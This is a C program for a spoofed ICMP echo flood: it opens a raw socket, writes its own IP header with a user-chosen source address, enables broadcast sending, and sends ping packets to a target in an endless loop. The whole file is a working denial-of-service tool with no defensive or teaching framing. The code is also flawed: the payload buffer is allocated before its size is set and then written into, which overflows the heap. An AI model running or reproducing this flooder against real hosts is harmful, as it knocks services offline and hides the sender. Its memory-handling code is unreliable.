#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

u_short in_cksum(u_short *ptr, size_t nbytes);

// Usage: <program name> <source IP> <destination IP> [Payload Size]
int main(int argc, char *argv[]) {
    if (argc < 3) {
        // at least 2 arguments (except the first one in argv[])
        printf("Usage: %s <source IP> <destination IP> [payload size] [payload]\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    in_addr_t source_ip_addr, dest_ip_addr;
    size_t payload_size = 0;
    int sent = 0; // the amount of sent packets
    int sent_size;
    
    source_ip_addr = inet_addr(argv[1]); // source IP address
    dest_ip_addr = inet_addr(argv[2]); // destination IP address
    
    char *payload = (char *)malloc(payload_size);
    if (argc > 4) {
        // >= 4 arguments (except the first one in argv[])
        payload_size = atoi(argv[3]);
        strlcpy(payload, argv[4], payload_size);
    } else if (argc == 4) {
        // only 3 arguments (except the first one in argv[])
        printf("Usage: %s <source IP> <destination IP> [payload size] [payload]\n", argv[0]);
        exit(EXIT_FAILURE);
    } else {
        // only 2 arguments (except the first one in argv[])
        // default payload
        strlcpy(payload, "default payload", payload_size);
    }
    
    // create raw socket
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("could not create socket, root permission required");
        exit(EXIT_FAILURE);
    }
    
    int on = 1;
    
    // provide IP headers
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (const char *)&on, sizeof(on)) == -1) {
        perror("setsockopt: could not enable IP header");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    
    // allow socket to send datagrams to broadcast addresses
    if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, (const char *)&on, sizeof(on)) == -1) {
        perror("setsockopt: could not enable broadcast");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    
    // calculate total packet size
    size_t packet_size = sizeof(struct ip) + sizeof(struct icmp) + payload_size;
    char *packet = (char *)malloc(packet_size);
    
    if (!packet) {
        perror("out of memory");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    
    struct ip *ip = (struct ip *)packet; // IP header
    struct icmp *icmp = (struct icmp *)(packet + sizeof(struct ip)); // ICMP header
    
    // init packet
    memset(packet, 0, packet_size);
    
    // set ip header
    ip->ip_v = IPVERSION;
    ip->ip_hl = 5;
    ip->ip_tos = IPTOS_LOWDELAY;
    ip->ip_len = packet_size;
    ip->ip_id = rand();
    ip->ip_off = 0;
    ip->ip_ttl = 255;
    ip->ip_p = IPPROTO_ICMP;
    ip->ip_src.s_addr = source_ip_addr;
    ip->ip_dst.s_addr = dest_ip_addr;
    
    // set icmp header
    icmp->icmp_type = ICMP_ECHO;
    icmp->icmp_code = 0;
    icmp->icmp_seq = rand();
    icmp->icmp_id = rand();
    icmp->icmp_cksum = 0;
    
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = dest_ip_addr;
    memset(serv_addr.sin_zero, 0, sizeof(serv_addr.sin_zero));
    
    // set payload
    strlcpy(packet + sizeof(struct ip) + sizeof(struct icmp), payload, payload_size);
    
    printf("flooding...\n");
    
    for (;;) {
//        memset(packet + sizeof(struct ip) + sizeof(struct icmp), rand() % 255, payload_size);
        
        // recalculate checksum
        icmp->icmp_cksum = 0;
        icmp->icmp_cksum = in_cksum((u_short *)icmp, sizeof(struct icmp) + payload_size);
        
        if ((sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr))) < 1) {
            perror("sent failed");
            break;
        }
        
        ++sent;
        printf("%d packets sent\r", sent);
        fflush(stdout);
        
        usleep(10000);
    }
    
    free(payload);
    free(packet);
    close(sockfd);
    
    return 0;
}

u_short in_cksum(u_short *ptr, size_t nbytes) {
    register long sum = 0;
    u_short odd_byte;
    register u_short ans = 0;
    
    while (nbytes > 1) {
        sum += *(ptr++);
        nbytes -= 2;
    }
    
    if (nbytes == 1) {
        odd_byte = 0;
        *((u_char *)&odd_byte) = *(u_char *)ptr;
        sum += odd_byte;
    }
    
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    ans = ~sum;
    
    return (ans);
}
